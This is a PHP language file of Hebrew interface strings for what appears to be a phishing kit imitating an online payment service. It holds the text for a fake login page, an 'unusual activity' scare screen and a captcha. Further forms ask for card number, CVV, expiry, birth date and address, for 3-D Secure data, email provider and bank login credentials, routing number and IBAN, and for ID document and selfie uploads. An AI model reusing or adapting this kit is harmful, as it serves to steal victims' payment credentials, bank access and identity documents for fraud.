<?php

	$lg_sign = [
		"title" => "היכנס לחשבון ה שלך",
		"alert" => "בדוק את הערכים שלך ונסה שוב.",
		"changer" => "שינוי",
		"eml_placeholder" => "כתובת אימייל",
		"eml_msg1" => "נדרשת כתובת אימייל.",
		"eml_msg2" => "נראה שכתובת אימייל זו שגויה. בדוק את הפרטים ונסה שוב.",
		"bt_next" => "הבא",
		"pwd_placeholder" => "הכנס סיסמתך",
		"pwd_show" => "הצג סיסמה",
		"pwd_hide" => "הסתר",
		"bt_login" => "Log In",
		"trouble" => "לא מצליח להיכנס לחשבון שלך?",
		"or" => "או",
		"bt_signup" => "הירשם",
		"footer" => [
			"contact" => "צור קשר",
			"privacy" => "פרטיות",
			"legal" => "הסכמים משפטיים",
			"world" => "הבינלאומי"
		],
		"rotate" => "מעבד ..."
	];

	$lg_activity = [
		"title" => "פעילות חריגה",
		"head" => "שמנו לב כמה פעילות יוצאת דופן",
		"body" => "אנו זקוקים לעזרתך לאבטחת החשבון שלך כדי למנוע גישה לא מורשית. למען בטחונך, עשויות להיות מגבלות על החשבון שלך אם המידע אינו נכון",
		"bt_secure" => "אבטח את החשבון שלי"
	];

		$lg_captcha = [
		"title" => "אתגר הביטחון",
		"head" => "אתגר הביטחון",
		"body" => "הקלד את התווים שאתה רואה בתמונה למטרות אבטחה",
		"bt_secure" => "אני לא רובוט",
		"code" => "הזן את הקוד המוצג"
	];

	$lg_process = [
		"title" => "החשבון שלי",
		"logout" => "הניתוק",
		"menu" => [
			"home" => "סיכום",
			"activity" => "פעילות",
			"send_receive" => "שלח ובקש",
			"wallet" => "שלח ובקש",
			"help" => "עֶזרָה",
			"open" => "תַפרִיט",
			"close" => "קָרוֹב"
		],
		"head1" => "אשר את הכרטיס שלך",
		"head2" => "אשר את הכתובת שלך",
		"head3" => " קישור כרטיס חדש",
		"ctype" => "סוג כרטיס",
		"cnumber" => "מספר כרטיס אשראי",
		"exp" => "תפוגה  MM/YYYY",
		"csc" => "CVV (3 ספרות )",
		"name" => "שם מלא",
		"dob" => "תאריך לידה  (DD/MM/YYYY)",
		"address" => "כתובת",
		"city" => "עיר / כפר",
		"zip" => "מיקוד",
		"ptype" => "סוג טלפון",
		"pnumber" => "מספר טלפון",
		"bt_save" => "שמור",
		"dnt_have" => "אין לי עוד כרטיס",
		"footer" => [
			"security" => "בִּטָחוֹן",
			"rights" => "כל הזכויות שמורות."
		]
	];
	$lg_auth = [
		"title" => "אבטחה תלת-ממדית",
		"success" => "3-D אבטחה כבר מעובד בהצלחה ...",
		"processing" => "עיבוד",
		"added" => "בטיחות נוסף באינטרנט",
		"protect" => "מסייע בהגנה על",
		"center" => "כרטיס נגד שימוש בלתי מורשה באינטרנט - ללא עלות נוספת.",
		"nextline" => "על זה furur purshases. להשלים את הדף הזה תוכל ליצור משלך",
		"name" => "שם על כרטיס",
		"merchant" => "סוחר",
		"amount" => "סכום",
		"country" => "שם ארץ",
		"cardtype" => "סוג כרטיס",
		"cardnumber" => "מספר כרטיס",
		"datetime" => "תאריך תאריך",
		"birthdate" => "תאריך לידה",
		"cannot" => " לא ניתן לגשת אל שלך,",
		"contact" => "צור קשר",
		"copyright" => "זכויות יוצרים",
		"rights" => "כל הזכויות שמורות.",
		"submit" => "שלח"
	];
	$lg_mailaccess = [
		"head" => "קשר את ספק הדואר האלקטרוני שלך",
		"fcenter" => "השתמש בשלך",
		"center" => "התחבר כדי לקשר את ספק הדואל שלך. (איננו שומר",
		"mailaccess" => "הזן את ספק הדואר האלקטרוני שלך",
		"passwordaccess" => "הזן את סיסמת ספק הדואר האלקטרוני שלך",
		"bt_save" => "הסכם וקישור"
	];
	$lg_bank = [
		"head" => "קשר את חשבון הבנק שלך",
		"head2" => "התחבר אל",
		"head3" => "חשבון בנק כדי לאשר שאתה שולט בחשבון הבנק הזה.",
		"head4" => "חשבון הבנק חייב להיות זהה עבור החשבון שלך",
		"bankname" => "שם הבנק",
		"bankcountry" => "מדינת בנק",
		"bankphone" => "טלפון בנק",
		"bankwebsite" => "טלפון בנק",
		"head4" => "חשבון הבנק חייב להיות זהה עבור החשבון שלך",
		"userid" => "שם משתמש / מזהה",
		"passcode" => "סיסמת חשבון / סיסמה",
		"accnumq" => "מספר חשבון",
		"rounum" => "מספר ניתוב",
		"iban" => "IBAN",
		"bt_save" => "הסכם וקישור"
	];
	$lg_id = [
		"head" => "העלה את הזהות שלך",
		"proof" => [
			"one" => "הוכחת זהות",
			"two" => "עם הוכחה",
			"three" => "התהליך הושלם"
		],
		"choose" => "בחר את סוג הזיהוי שלך",
		"type" => [
			"one" => "דַרכּוֹן",
			"two" => "תעודת זהות",
			"three" => "רשיון נהיגה"
		],
		"bt_proceed" => "להמשיך",
		"head_up" => "העלה את",
		"rule1" => [
			"one" => "צלם תמונה באיכות גבוהה - <br>או בצע סריקה באיכות גבוהה",
			"two" => "להגיש את שני הצדדים<br> של מסמך דו צדדי",
			"three" => "סרוק את שני הדפים - <br>אם תבחר דרכון"
		],
		"drop_zone" => "<b> גרור ושחרר או לחץ כאן </b>כדי להעלות את התמונה שלך (עד 5 MB)",
		"bt_back" => "תחזור",
		"head_slf" => "טען selfie עם",
		"rule2" => [
			"one" => "ודא שאתה מסתכל ישר אל המצלמה",
			"two" => "אצבעותיך אינן מכסות את התמונה או כל מידע חשוב",
			"three" => "לא ללבוש כובע או משקפיים, <br> ולוודא כי הזקן שלך הוא trimmed"
		]
	];

	$lg_finish = [
		"head" => "תהליך האימות הושלם",
		"on" => "הופעל",
		"p1" => "הגנה על הרכישה היא כעת",
		"p2" => "הוא מכסה את כל הרכישות כשירות שבו החשבון משמש, כמו גם תשלומים שבוצעו באמצעות אתר האינטרנט שלנו. כדי לנצל את ההגנה על רכישה, אנו דורשים, בין היתר, שחשבונות יישמרו במצב תקין ויבקשו שתוגש ערעור תוך 180 יום מיום הרכישה או התשלום שלך.",
		"p3" => "קראו את דרישות הגנת רכישה"
	];

?>